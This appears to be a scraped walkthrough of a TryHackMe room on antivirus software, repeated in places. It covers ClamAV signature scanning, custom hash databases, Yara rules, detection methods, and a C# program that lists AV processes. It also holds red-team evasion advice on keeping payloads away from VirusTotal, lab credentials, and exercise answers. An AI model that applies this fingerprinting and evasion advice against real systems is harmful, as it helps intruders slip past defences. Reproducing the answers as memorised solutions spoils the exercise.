[========================>] 41 / 41 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : Win . Malware . Swrort - 9872015 - 0 FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : Win . Test . EICAR_HDB - 1 FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : OK The above output shows that ClamAV software correctly analyzed and flagged two of our tested files (EICAR, backdoor1, AV-Check, and notes.txt) as malicious. However, it incorrectly identified the backdoor2 as non-malicious while it does. You can run clamscan.exe --debug <file_to_scan> , and you will see all modules loaded and used during the scanning. For example, it uses the unpacking method to split the files and look for a predefined malicious sequence of bytecode values, and that is how it was able to detect the C# backdoor 1. The bytecode value of the Metasploit shellcode used in backdoor 1 was previously identified and added to ClamAV's database. However, backdoor 2 uses an encryption technique (XOR) for the Metasploit shellcode, resulting in different sequences of bytecode values that it doesn't find in the ClamAV database. While the ClamAV was able to detect the EICAR.COM test file as malicious using the md5 signature-based technique. To confirm this, we can re-scan the EICAR.COM test file again in debug mode (--debug). At some point in the output, you will see the following message: LibClamAV debug : FP SIGNATURE : 44d88612fea8a8f36de82e1278abb02f : 68 : Win . Test . EICAR_HDB - 1 # Name: eicar.com, Type: CL_TYPE_TEXT_ASCII \ufeffNow let's generate the md5 value of the EICAR.COM if it matches what we see in the previous message from the output. We will be using the sigtool for that: Command Prompt c :\\> \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 c :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com 44d88612fea8a8f36de82e1278abb02f : 68 : eicar . com If you closely check the generated MD5 value, 44d88612fea8a8f36de82e1278abb02f , it matches. Create Your Own Signature Database \u00b6 One of ClamAV's features is creating your own database, allowing you to include items not found in the official ClamAV database. Let's try to create a signature for Backdoor 2, which ClamAV already missed, and add it to a database. The following are the required steps: Generate an MD5 signature for the file. Add the generated signature into a database with the extension \".hdb\". Re-scan the ClamAV against the file using our new database. First, we will be using the sigtool tool, which is included in the ClamAV suite, to generate an MD5 hash of backdoor2.exe using the --md5 argument. Generate an MD5 hash C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 backdoor2 . exe 75047189991b1d119fdb477fef333ceb : 6144 : backdoor2 . exe As shown in the output, the generated hash string contains the following structure: Hash:Size-in-byte:FileName . Note that ClamAV uses the generated value in the comparison during the scan. Now that we have the MD5 hash, now let's create our own database. We will use the sigtool tool and save the output into a file using the > thm.hdb as follows, Generate our new database C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 backdoor2 . exe > thm . hdb As a result, a thm.hdb file will be created in the current directory that executes the command. We already know that ClamAV did not detect the backdoor2.exe using the official database! Now, let's re-scan it using the database we created, thm.hdb , and see the result! Re-scanning backdoor2.exe using the new database! C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d thm . hdb backdoor2 . exe Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 10 / 10 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : backdoor2 . exe . UNOFFICIAL FOUND As we expected, the ClamAV tool flagged the backdoor2.exe binary as malicious based on the database we provided. As a practice, add the AV-Check.exe's MD5 signature into the same database we already created, then check whether ClamAV can flag AV-Check.exe as malicious. Yara Rules for Static Detection \u00b6 One of the tools that help in static detection is Yara . Yara is a tool that allows malware engineers to classify and detect malware. Yara uses rule-based detection, so in order to detect new malware, we need to create a new rule. ClamAV can also deal with Yara rules to detect malicious files. The rule will be the same as in our database in the previous section. To create a rule, we need to examine and analyze the malware; based on the findings, we write a rule. Let's take AV-Check.exe as an example and write a rule for it. First, let's analyze the file and list all human-readable strings in the binary using the strings tool. As a result, we will see all functions, variables, and nonsense strings. But, if you look closely, we can use some of the unique strings in our rules to detect this file in the future. The AV-Check uses a program database (.pdb), which contains a type and symbolic debugging information of the program during the compiling. Command Prompt C :\\ Users \\ thm \\ Desktop \\ Samples > strings AV-Check . exe | findstr pdb C :\\ Users \\ thm \\ source \\ repos \\ AV-Check \\ AV-Check \\ obj \\ Debug \\ AV-Check . pdb We will use the path in the previous command's output as our unique string example in the Yara rule that we will create. The signature could be something else in the real world, such as Registry keys, commands, etc. If you are not familiar with Yara, then we suggest checking the Yara THM room. The following is Yara's rule that we will use in our detection: rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" condition: $a } Let's explain this Yara's rule a bit more. The rule starts with rule thm_demo_rule , which is the name of our rule. ClamAV uses this name if a rule matches. The metadata section, which is general information, contains the author and description, which the user can fill. The strings section contains the strings or bytecode that we are looking for. We are using the C# program's database path in this case. Notice that we add an extra in that path to escape the special character, so it does not break the rule. In the condition section, we specify if the defined string is found in the string section, then flag the file. Note that Yara rules must store in a .yara extension file for ClamAV to deal with it. Let's re-scan the c:\\Users\\thm\\Desktop\\Samples folder again using the Yara rule we created. You can find a copy of the Yara rule on the desktop at c:\\Users\\thm\\Desktop\\Files\\thm-demo-1.yara . Scanning using the Yara rule C :\\ Users \\ thm > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d Desktop \\ Files \\ thm-demo - 1 . yara Desktop \\ Samples Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 40 / 40 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : YARA . thm_demo_rule . UNOFFICIAL FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : YARA . thm_demo_rule . UNOFFICIAL FOUND As a result, ClamAV can detect the AV-Check.exe binary as malicious based on the Yara rule we provide. However, ClamAV gave a false-positive result where it flagged the notes.txt file as malicious. If we open the notes.txt file, we can see that the text contains the same path we specified in the rule. Let's improve our Yara rule to reduce the false-positive result. We will be specifying the file type in our rule. Often, the types of a file can be identified using magic numbers, which are the first two bytes of the binary. For example, executable files (.exe) always start with the ASCII \"MZ\" value or \"4D 5A\" in hex. To confirm this, let's use the HxD application, which is a freeware Hex Editor, to examine the AV-Check.exe binary and see the first two bytes. Note that the HxD is already available in the provided VM. Knowing this will help improve the detection, let's include this in our Yara rule to flag only the .exe files that contain our signature string as malicious. The following is the improved Yara rule: rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" $b = \"MZ\" condition: $b at 0 and $a } In the new Yara rule, we defined a unique string ($b) equal to the MZ as an identifier for the .exe file type. We also updated the condition section, which now includes the following conditions: If the string \"MZ\" is found at the 0 location, the file's beginning. If the unique string (the path) occurs within the binary. In the condition section, we used the AND operator for both definitions in 1 and 2 are found, then we have a match. You can find the updated rule in Desktop\\Files\\thm-demo-2.yara . Now that we have our updated Yara rule, now let's try it again. Scanning using the Yara rule C :\\ Users \\ thm > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d Desktop \\ Files \\ thm-demo - 2 . yara Desktop \\ Samples Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 40 / 40 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : YARA . thm_demo_rule . UNOFFICIAL FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : OK Answer the questions bellow Question: What is the sigtool tool output to generate an MD5 of the AV-Check.exe binary? Ans: f4a974b0cf25dca7fbce8701b7ab3a88:6144:AV-Check.exe Question: Use the strings tool to list all human-readable strings of the AV-Check binary. What is the flag? Ans: THM{Y0uC4nC-5tr16s} Task 6: Other Detection Techniques \u00b6 The concept of static detection is relatively simple. In this section, we will discuss the different types of detection techniques. Dynamic Detection \u00b6 The dynamic detection approach is advanced and more complicated than static detection. Dynamic detection is focused more on checking files at runtime using different methods. The following diagram shows the dynamic detection scanning flow: The first method is by monitoring Windows APIs. The detection engine inspects Windows application calls and monitors Windows API calls using Windows Hooks . Another method for dynamic detection is Sandboxing. A sandbox is a virtualized environment used to run malicious files separated from the host computer. This is usually done in an isolated environment, and the primary goal is to analyze how the malicious software acts in the system. Once the malicious software is confirmed, a unique signature and rule will be created based on the characteristic of the binary. Finally, a new update will be pushed into the cloud database for future use. This type of detection also has drawbacks because it requires executing and running the malicious software for a limited time in the virtual environment to protect the system resources. As with other detection techniques, dynamic detection can be bypassed. Malware developers implement their software to not work within the virtual or simulated environment to avoid dynamic analysis. For example, they check if the system spawns a real process of executing the software before running malicious activities or let the software wait sometime before execution. For more information about sandbox evasion, we suggest checking the THM room: Sandbox Evasion! Heuristic and Behavioral Detection \u00b6 Heuristic and behavioral detection have become essential in today's modern AV products. Modern AV software relies on this type of detection to detect malicious software. The heuristic analysis uses various techniques, including static and dynamic heuristic methods: Static Heuristic Analysis is a process of decompiling (if possible) and extracting the source code of the malicious software. Then, the extracted source code is compared to other well-known virus source codes. These source codes are previously known and predefined in a heuristic database. If a match meets or exceeds a threshold percentage, the code is flagged as malicious. Dynamic Heuristic Analysis is based on predefined behavioral rules. Security researchers analyzed suspicious software in isolated and secured environments. Based on their findings, they flagged the software as malicious. Then, behavioral rules are created to match the software's malicious activities within a target machine. The following are examples of behavioral rules: If a process tries to interact with the LSASS.exe process that contains users' NTLM hashes, Kerberos tickets, and more If a process opens a listening port and waits to receive commands from a Command and Control (C2) server The following diagram shows the Heuristic and behavioral detection scanning flow: Summing up detection methods \u00b6 Let's summarize how modern AV software works as one unit, including all components, and combines various features and detection techniques to implement its AV engine. The following is an example of the components of an antivirus engine: In the diagram, you can see a suspicious Foobar.zip file is passed to AV software to scan. AV software recognizes that it is a compressed file (.zip). Since the software supports .zip files, it applies an un-archiver feature to extract the files ( Foobar.exe ). Next, it identifies the file type to know which module to work with and then performs a PE parsing operation to pull the binary's information and other characteristic features. Next, it checks whether the file is packed; if it is, it unpacks the code. Finally, it passes the collected information and the binary to the AV engine, where it tries to detect if it is malicious and gives us the result. Answer the questions bellow Question: Which detection method is used to analyze malicious software inside virtual environments? Ans: Dynamic Detection Task 7: AV Testing and Fingerprinting \u00b6 AV Vendors \u00b6 Many AV vendors in the market mainly focus on implementing a security product for home or enterprise users. Modern AV software has improved and now combines antivirus capabilities with other security features such as Firewall, Encryption, Anti-spam, EDR, vulnerability scanning, VPN, etc. It is important to note that it is hard to recommend which AV software is the best. It all comes down to user preferences and experience. Nowadays, AV vendors focus on business security in addition to end-user security. We suggest checking the AV comparatives website for more details on enterprise AV vendors. AV Testing Environment \u00b6 AV testing environments are a great place to check suspicious or malicious files. You can upload files to get them scanned against various AV software vendors. Moreover, platforms such as VirusTotal use various techniques and provide results within seconds. As a red teamer or a pentester, we must test a payload against the most well-known AV applications to check the effectiveness of the bypass technique. VirusTotal \u00b6 VirusTotal is a well-known web-based scanning platform for checking suspicious files. It allows users to upload files to be scanned with over 70 antivirus detection engines. VirusTotal passes the uploaded files to the Antivirus engines to be checked, returns the result, and reports whether it is malicious or not. Many checkpoints are applied, including checking for blacklisted URLs or services, signatures, binary analysis, behavioral analysis, as well as checking for API calls. In addition, the binary will be run and checked in a simulated and isolated environment for better results. For more information and to check other features, you may visit the VirusTotal website. VirusTotal alternatives \u00b6 Important Note : VirusTotal is a handy scanning platform with great features, but it has a sharing policy. All scanned results will be passed and shared with antivirus vendors to improve their products and update their databases for known malware. As a red teamer, this will burn a dropper or a payload you use in engagements. Thus, alternative solutions are available for testing against various security product vendors, and the most important advantage is that they do not have a sharing policy. However, there are other limitations. You will have a limited number of files to scan per day; otherwise, a subscription is needed for unlimited testing. For those reasons, we recommend you only test your malware on sites that do not share information, such as: AntiscanMe (6 free scans a day) Virus Scan Jotti's malware scan Fingerprinting AV software \u00b6 As a red teamer, we do not know what AV software is in place once we gain initial access to a target machine. Therefore, it is important to find and identify what host-based security products are installed, including AV software. AV fingerprinting is an essential process to determine which AV vendor is present. Knowing which AV software is installed is also quite helpful in creating the same environment to test bypass techniques. This section introduces different ways to look at and identify antivirus software based on static artifacts, including service names, process names, domain names, registry keys, and filesystems. The following table contains well-known and commonly used AV software. Antivirus Name Service Name Process Name Microsoft Defender WinDefend MSMpEng.exe Trend Micro TMBMSRV TMBMSRV.exe Avira AntivirService, Avira.ServiceHost avguard.exe, Avira.ServiceHost.exe Bitdefender VSSERV bdagent.exe, vsserv.exe Kaspersky AVP<Version #> avp.exe, ksde.exe AVG AVG Antivirus AVGSvc.exe Norton Norton Security NortonSecurity.exe McAfee McAPExe, Mfemms MCAPExe.exe, mfemms.exe Panda PavPrSvr PavPrSvr.exe Avast Avast Antivirus afwServ.exe, AvastSvc.exe SharpEDRChecker \u00b6 One way to fingerprint AV is by using public tools such as SharpEDRChecker . It is written in C# and performs various checks on a target machine, including checks for AV software, like running processes, files' metadata, loaded DLL files, Registry keys, services, directories, and files. We have pre-downloaded the SharpEDRChecker from the GitHub repo so that we can use it in the attached VM. Now we need to compile the project, and we have already created a shortcut to the project on the desktop (SharpEDRChecker). To do so, double-click on it to open it in Microsoft Visual Studio 2022. Now that we have our project ready, we need to compile it, as shown in the following screenshot: Once it is compiled, we can find the path of the compiled version in the output section, as highlighted in step 3. We also added a copy of the compiled version in the C:\\Users\\thm\\Desktop\\Files directory. Now let's try to run it and see the result as follows: Command Prompt! C :\\> SharpEDRChecker . exe SharpEDRChecker's Summary [!] Directory Summary : [-] C :\\ Program Files \\ Windows Defender : defender [-] C :\\ Program Files \\ Windows Defender Advanced Threat Protection : defender , threat [-] C :\\ Program Files ( x86 )\\ Windows Defender : defender [!] Service Summary : [-] PsShutdownSvc : sysinternal [-] Sense : defender , threat [-] WdNisSvc : defender , nissrv [-] WinDefend : antimalware , defender , malware , msmpeng [-] wscsvc : antivirus As a result, the Windows Defender is found based on folders and services. Note that this program may be flagged by AV software as malicious since it does various checks and APIs calls. C# Fingerprint checks \u00b6 Another way to enumerate AV software is by coding our own program. We have prepared a C# program in the provided Windows 10 Pro VM, so we can do some hands-on experiments! You can find the project's icon on the desktop (AV-Check) and double-click it to open it using Microsoft Visual Studio 2022. The following C# code is straightforward, and its primary goal is to determine whether AV software is installed based on a predefined list of well-known AV applications. using System ; using System.Management ; internal class Program { static void Main ( string [] args ) { var status = false ; Console . WriteLine ( \"[+] Antivirus check is running .. \" ); string [] AV_Check = { \"MsMpEng.exe\" , \"AdAwareService.exe\" , \"afwServ.exe\" , \"avguard.exe\" , \"AVGSvc.exe\" , \"bdagent.exe\" , \"BullGuardCore.exe\" , \"ekrn.exe\" , \"fshoster32.exe\" , \"GDScan.exe\" , \"avp.exe\" , \"K7CrvSvc.exe\" , \"McAPExe.exe\" , \"NortonSecurity.exe\" , \"PavFnSvr.exe\" , \"SavService.exe\" , \"EnterpriseService.exe\" , \"WRSA.exe\" , \"ZAPrivacyService.exe\" }; var searcher = new ManagementObjectSearcher ( \"select * from win32_process\" ); var processList = searcher . Get (); int i = 0 ; foreach ( var process in processList ) { int _index = Array . IndexOf ( AV_Check , process [ \"Name\" ]. ToString ()); if ( _index > - 1 ) { Console . WriteLine ( \"--AV Found: {0}\" , process [ \"Name\" ]. ToString ()); status = true ; } i ++ ; } if ( ! status ) { Console . WriteLine ( \"--AV software is not found!\" ); } } } Let's explain the code a bit more. We have predefined a list of well-known AV applications in the AV_Check array within our code, which is taken from the previous section, where we discussed fingerprinting AV software (table above). Then, we use the Windows Management Instrumentation Command-Line (WMIC) query ( select * from win32_process ) to list all currently running processes in the target machine and store them in the processList variable. Next, we go through the currently running processes and compare if they exist in the predefined array. If a match is found, then we have AV software installed. The C# program utilizes a WMIC object to list current running processes, which may be monitored by AV software. If AV software is poorly implemented to monitor the WMIC queries or Windows APIs, it may cause false-positive results in scanning our C# program. Let's compile an x86 version of the C# program, upload it to the VirusTotal website, and check the results! To compile the C# program in the Microsoft Visual Studio 2022, select Build from the bar menu and choose the Build Solution option. Then, if it complied correctly, you can find the path of the compiled version in the output section, as highlighted in step 3 in the screenshot below. If we upload the AV-Check program to the VirusTotal website and check the result, surprisingly, VirusTotal showed that two AV vendors (MaxSecure and SecureAge APEX) flagged our program as malicious! Thus, this is a false-positive result where it incorrectly identifies a file as malicious where it is not. One of the possible reasons is that these AV vendors' software uses a machine-learning classifier or rule-based detection method that is poorly implemented. For more details about the actual submission report, see here . There are four main sections: Detection, Details, Behavior, and Community. If we check the Behavior section, we can see all calls of Windows APIs, Registry keys, modules, and the WMIC query. In the Detection section, there are Sigma rules that, if a system event during execution is matched (in the sandbox environment), consider the file malicious. This result is likely based on the rules; VirusTotal flagged our program because of the Process Ghosting technique , as shown in the following screenshot. Now let's re-compile the C# program using an x64 CPU and check if the check engines act differently. In our submission attempt this time, three AV vendors' software (Cyren AV is added to the list) flagged the file as malicious. For more details about the actual submission report, look here . Note: if you try to submit a file to the VirusTotal website, it may give you a different result. Keep in mind that VirusTotal shares submission reports with the Antivirus vendors to improve their AV detection engines, including false-positive results. Answer the questions bellow Question: For the C# AV fingerprint, try to rewrite the code in a different language, such as Python, and check whether VirusTotal flag it as malicious. Ans: No answer needed Question: Read the Above! Ans: No answer needed Task 8: Conclusion \u00b6 Recap \u00b6 In this room, we covered Antivirus software and its detection approaches. As a red teamer, it is important to know how AV software works and detects malicious applications to be able to implement bypass techniques. We also discussed the static detection technique in detail and showcased how ClamAV, an open-source Antivirus, detects malicious files using static analysis. Additionally, we showed how to create your own database and use Yara rules to detect malicious files that are not detected by the official database. Once we obtain access to a target, it is essential to enumerate the target machine before performing further actions, such as privilege escalation or lateral movement. The reason is to not trigger alerts for suspicious activities, which may cause losing access to the target machine. Thus, we introduced two methods to practice AV fingerprinting using public and private tools.","title":"Introduction to Antivirus"},{"location":"tryhackme/room/l/introtoav/#introduction-to-antivirus","text":"Room at https://tryhackme.com/room/introtoav","title":"Introduction to Antivirus"},{"location":"tryhackme/room/l/introtoav/#task-1-introduction","text":"Welcome to Intro to AV Antivirus (AV) software is one of the essential host-based security solutions available to detect and prevent malware attacks within the end-user's machine. AV software consists of different modules, features, and detection techniques, which are discussed in this room. As a red teamer or pentester, it is essential to be familiar with and understand how AV software and its detection techniques work. Once this knowledge is acquired, it will be easier to work toward AV evasion techniques.","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/introtoav/#learning-objectives","text":"What is Antivirus software? Antivirus detection approaches Enumerate installed AV software in the target machine Test in a simulated environment","title":"Learning Objectives"},{"location":"tryhackme/room/l/introtoav/#room-prerequisites","text":"General knowledge of host-based detection solutions; check The Lay of the Land room for more information. General experience with Hashing crypto; check the Hashing - Crypto 101 room for more information. Basic knowledge of Yara Rules; check the THM Yara room for more information. Answer the questions bellow Question: Which Antivirus software is running on the VM? Ans: name","title":"Room prerequisites"},{"location":"tryhackme/room/l/introtoav/#task-2-antivirus-software","text":"","title":"Task 2: Antivirus Software"},{"location":"tryhackme/room/l/introtoav/#what-is-av-software","text":"Antivirus (AV) software is an extra layer of security that aims to detect and prevent the execution and spread of malicious files in a target operating system. It is a host-based application that runs in real-time (in the background) to monitor and check the current and newly downloaded files. The AV software inspects and decides whether files are malicious using different techniques, which will be covered later in this room. Interestingly, the first antivirus software was designed solely to detect and remove computer viruses . Nowadays, that has changed; modern antivirus applications can detect and remove computer viruses as well other harmful files and threats.","title":"What is AV software?"},{"location":"tryhackme/room/l/introtoav/#what-does-av-software-look-for","text":"Traditional AV software looks for malware with predefined malicious patterns or signatures. Malware is harmful software whose primary goal is to cause damage to a target machine, including but not limited to: Gain full access to a target machine. Steal sensitive information such as passwords. Encrypt files and cause damage to files. Inject other malicious software or unwanted advertisements. Used the compromised machine to perform further attacks such as botnet attacks.","title":"What does AV software look for?"},{"location":"tryhackme/room/l/introtoav/#av-vs-other-security-products","text":"Alt text In addition to AV software, other host-based security solutions provide real-time protection to endpoint devices. Endpoint Detection and Response (EDR) is a security solution that provides real-time protection based on behavioral analytics. An antivirus application performs scanning, detecting, and removing malicious files. On the other hand, EDR monitors various security checks in the target machine, including file activities, memory, network connections, Windows registry, processes, etc. Modern Antivirus products are implemented to integrate the traditional Antivirus features and other advanced functionalities (similar to EDR functionalities) into one product to provide comprehensive protection against digital threats. For more information about Host-based security solutions, we suggest visiting the THM room: The Lay of the Land .","title":"AV vs other security products"},{"location":"tryhackme/room/l/introtoav/#av-software-in-the-past-and-present","text":"McAfee Associates, Inc. started the first AV software implementation in 1987. It was called \"VirusScan,\" and its main goal at that time was to remove a virus named \"Brain\" that infected John McAfee's computer. Later, other companies joined in the battle against viruses. AV software was called scanners, and they were command-line software that searched for malicious patterns in files. Since then, things have changed. AV software nowadays uses a Graphical User Interface (GUI) to perform scans for malicious files and other tasks. Malware programs have also expanded in scope and now target victims on Windows and other operating systems. Modern AV software supports most devices and platforms, including Windows, Linux, macOS, Android, and iOS. Modern AV software has improved and become more intelligent and sophisticated, as they pack a bundle of versatile features, including Antivirus, Anti-Exploit, Firewall, Encryption tool, etc. We will be discussing some AV features in the next task. Answer the questions bellow Question: What does AV mean? Ans: Antivirus Question: Which PC Antivirus vendor implemented the first AV software on the market? McAfee Question: Antivirus software is a _____-based security solution. host-based","title":"AV software in the past and present"},{"location":"tryhackme/room/l/introtoav/#task-3-antivirus-features","text":"","title":"Task 3: Antivirus Features"},{"location":"tryhackme/room/l/introtoav/#antivirus-engines","text":"An AV engine is responsible for finding and removing malicious code and files. Good AV software implements an effective and solid AV core that accurately and quickly analyzes malicious files. Also, It should handle and support various file types, including archive files, where it can self-extract and inspect all compressed files. Most AV products share the same common features but are implemented differently, including but not limited to: Scanner Detection techniques Compressors and Archives Unpackers Emulators","title":"Antivirus Engines"},{"location":"tryhackme/room/l/introtoav/#scanner","text":"The scanner feature is included in most AV products: AV software runs and scans in real-time or on-demand. This feature is available in the GUI or through the command prompt. The user can use it whenever required to check files or directories. The scanning feature must support the most known malicious file types to detect and remove the threat. In addition, it also may support other types of scanning depending on the AV software, including vulnerabilities, emails, Windows memory, and Windows Registry.","title":"Scanner"},{"location":"tryhackme/room/l/introtoav/#detection-techniques","text":"An AV detection technique searches for and detects malicious files; different detection techniques can be used within the AV engine, including: Signature-based detection is the traditional AV technique that looks for predefined malicious patterns and signatures within files. Heuristic detection is a more advanced technique that includes various behavioral methods to analyze suspicious files. Dynamic detection is a technique that includes monitoring the system calls and APIs and testing and analyzing in an isolated environment. We will cover these techniques in the next task. A good AV engine is accurate and quickly detects malicious files with fewer false-positive results. We will showcase several AV products that provide inaccurate results and misclassify a file.","title":"Detection techniques"},{"location":"tryhackme/room/l/introtoav/#compressors-and-archives","text":"The \"Compressors and Archives\" feature should be included in any AV software. It must support and be able to deal with various system file types, including compressed or archived files: ZIP, TGZ, 7z, XAR, RAR, etc. Malicious code often tries to evade host-based security solutions by hiding in compressed files. For this reason, AV software must decompress and scan through all files before a user opens a file within the archive.","title":"Compressors and Archives"},{"location":"tryhackme/room/l/introtoav/#pe-portable-executable-parsing-and-unpackers","text":"Malware hides and packs its malicious code by compressing and encrypting it within a payload. It decompresses and decrypts itself during runtime to make it harder to perform static analysis. Thus, AV software must be able to detect and unpack most of the known packers (UPX, Armadillo, ASPack, etc.) before the runtime for static analysis. Malware developers use various techniques, such as Packing, to shrink the size and change the malicious file's structure. Packing compresses the original executable file to make it harder to analyze. Therefore, AV software must have an unpacker feature to unpack protected or compressed executable files into the original code. Another feature that AV software must have is Windows Portable Executable (PE) header parser. Parsing PE of executable files helps distinguish malicious and legitimate software (.exe files). The PE file format in Windows (32 and 64 bits) contains various information and resources, such as object code, DLLs, icon files, font files, and core dumps.","title":"PE (Portable Executable) Parsing and Unpackers"},{"location":"tryhackme/room/l/introtoav/#emulators","text":"An emulator is an Antivirus feature that does further analysis on suspicious files. Once an emulator receives a request, the emulator runs the suspect (exe, DLL, PDF, etc.) files in a virtualized and controlled environment. It monitors the executable files' behavior during the execution, including the Windows APIs calls, Registry, and other Windows files. The following are examples of the artifacts that the emulator may collect: API calls Memory dumps Filesystem modifications Log events Running processes Web requests An emulator stops the execution of a file when enough artifacts are collected to detect malware.","title":"Emulators"},{"location":"tryhackme/room/l/introtoav/#other-common-features","text":"The following are some common features found in AV products: A self-protection driver to guard against malware attacking the actual AV. Firewall and network inspection functionality. Command-line and graphical interface tools. A daemon or service. A management console. Answer the questions bellow Question: Which AV feature analyzes malware in a safe and isolated environment? Ans: Emulators Question: An _______ feature is a process of restoring or decrypting the compressed executable files to the original. Ans: Unpackers Question: Read the above to proceed to the next task, where we discuss the AV detection techniques. Ans: No answer needed","title":"Other common features"},{"location":"tryhackme/room/l/introtoav/#task-4-deploy-the-vm","text":"We have provided a Windows machine 10 Pro to complete this room. The VM can be accessed through the in-browser feature. Once the VM is deployed, your browser should split into two windows, as the following: If the browser doesn't split, you can select the \"Show Split View\" bottom located at the top of your browser. You can also connect via RDP, make sure you deploy the AttackBox or connect to the VPN. Use the following credentials below. Machine IP: MACHINE_IP Username: thm Password: TryHackM3 Connect to the VM via the RDP client user @machine $ xfreerdp / v : MACHINE_IP / u : thm / p : TryHackM3 Answer the questions bellow Question: Once you've deployed the VM, it will take a few minutes to boot up. Then, progress to the next task! Ans: No answer needed","title":"Task 4: Deploy the VM"},{"location":"tryhackme/room/l/introtoav/#task-5-av-static-detection","text":"Generally speaking, AV detection can be classified into three main approaches: Static Detection Dynamic Detection Heuristic and Behavioral Detection","title":"Task 5: AV Static Detection"},{"location":"tryhackme/room/l/introtoav/#static-detection","text":"A static detection technique is the simplest type of Antivirus detection, which is based on predefined signatures of malicious files. Simply, it uses pattern-matching techniques in the detection, such as finding a unique string, CRC (Checksums), sequence of bytecode/Hex values, and Cryptographic hashes (MD5, SHA1, etc.). It then performs a set of comparisons between existing files within the operating system and a database of signatures. If the signature exists in the database, then it is considered malicious. This method is effective against static malware. In this task, we will be using a signature-based detection method to see how antivirus products detect malicious files. It is important to note that this technique works against known malicious files only with pre-generated signatures in a database. Thus, the database needs to be updated from time to time. We will use the ClamAV antivirus software to demonstrate how signature-based detection identifies malicious files. The ClamAV software is pre-installed in the provided VM, and we can access it in the following path: c:\\Program Files\\ClamAV\\clamscan.exe. We will also scan a couple of malware samples, which can be found on the desktop. The Malware samples folder contains the following files: EICAR is a test file containing ASCII strings used to test AV software's effectiveness instead of real malware that could damage your machine. For more information, you may visit the official EICAR website, Here. Backdoor 1 is a C# program that uses a well-known technique to establish a reverse connection, including creating a process and executing a Metasploit Framework shellcode. Backdoor 2 is a C# program that uses process injection and encryption to establish a reverse connection, including injecting a Metasploit shellcode into an existing and running process. AV-Check is a C# program that enumerates AV software in a target machine. Note that this file is not malicious. We will discuss this tool in more detail in task 6. notes.txt is a text file that contains a command line. Note that this file is not malicious. ClamAV comes with its database, and during the installation, we need to download the recently updated version. Let's try to scan the Malware sample folder using the clamscan.exe binary and check how ClamAV performs against these samples. Command Prompt c :\\> \"c:\\Program Files\\ClamAV\\clamscan.exe\" c :\\ Users \\ thm \\ Desktop \\ Samples Loading : 22s , ETA : 0s [========================>] 8 . 61M / 8 . 61M sigs Compiling : 4s , ETA : 0s [========================>] 41 / 41 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : Win . Malware . Swrort - 9872015 - 0 FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : Win . Test . EICAR_HDB - 1 FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : OK The above output shows that ClamAV software correctly analyzed and flagged two of our tested files (EICAR, backdoor1, AV-Check, and notes.txt) as malicious. However, it incorrectly identified the backdoor2 as non-malicious while it does. You can run clamscan.exe --debug <file_to_scan> , and you will see all modules loaded and used during the scanning. For example, it uses the unpacking method to split the files and look for a predefined malicious sequence of bytecode values, and that is how it was able to detect the C# backdoor 1. The bytecode value of the Metasploit shellcode used in backdoor 1 was previously identified and added to ClamAV's database. However, backdoor 2 uses an encryption technique (XOR) for the Metasploit shellcode, resulting in different sequences of bytecode values that it doesn't find in the ClamAV database. While the ClamAV was able to detect the EICAR.COM test file as malicious using the md5 signature-based technique. To confirm this, we can re-scan the EICAR.COM test file again in debug mode (--debug). At some point in the output, you will see the following message: LibClamAV debug : FP SIGNATURE : 44d88612fea8a8f36de82e1278abb02f : 68 : Win . Test . EICAR_HDB - 1 # Name: eicar.com, Type: CL_TYPE_TEXT_ASCII \ufeffNow let's generate the md5 value of the EICAR.COM if it matches what we see in the previous message from the output. We will be using the sigtool for that: Command Prompt c :\\> \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 c :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com 44d88612fea8a8f36de82e1278abb02f : 68 : eicar . com If you 